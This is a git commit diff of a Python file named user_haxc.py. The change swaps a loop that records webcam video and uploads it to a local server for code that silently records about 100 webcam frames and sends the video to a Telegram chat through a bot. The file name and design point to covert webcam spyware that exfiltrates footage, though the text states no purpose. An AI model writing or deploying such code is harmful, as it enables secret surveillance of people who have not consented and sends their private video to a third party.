481868a43089be3eeefc05698ca11d99acdcebfe
Magnat12 <rizamatmu@gmail.com>
2024-07-13 12:53:04 +0500

    telebot

--- user_haxc.py
+++ user_haxc.py
@@ -1,43 +1,26 @@
-import requests
-import platform
+import telebot
 import cv2
-import time
-import os
+from token_1 import *
 
-headers = {'Content-Type': 'application/json'}
-name_devices = platform.node()
+bot = telebot.TeleBot(token)
 
-cap = cv2.VideoCapture(0)
-if not cap.isOpened():
-    print("Ошибка: не удалось открыть веб-камеру")
-    exit()
-
-while True:
-    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
-    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
-    output_file = os.path.join('output.avi')
-    fourcc = cv2.VideoWriter_fourcc(*'MJPG')
-    out = cv2.VideoWriter(output_file, fourcc, 20.0, (frame_width, frame_height))
-
-    start_time = time.time()
-    while True:
+def tel():
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        return
+    
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
+    
+    for _ in range(100):  
         ret, frame = cap.read()
         if not ret:
             break
-        if frame is not None:
-            out.write(frame)
-        else:
-            pass        
-        if (time.time() - start_time) > 20 or cv2.waitKey(1) & 0xFF == ord('q'):
-            break
-
-    out.release()
+        out.write(frame)
     cap.release()
-    cv2.destroyAllWindows()
+    out.release()
+    
+    with open('output.avi', 'rb') as video_file:
+        bot.send_video(chat_id=id, video=video_file)
 
-    url = 'http://192.168.1.104:3000/api/upload_video'
-    files = {'video': open(output_file, 'rb')}  
-    response = requests.post(url, files=files)
-    print(response.json())
-
-    break
+tel()
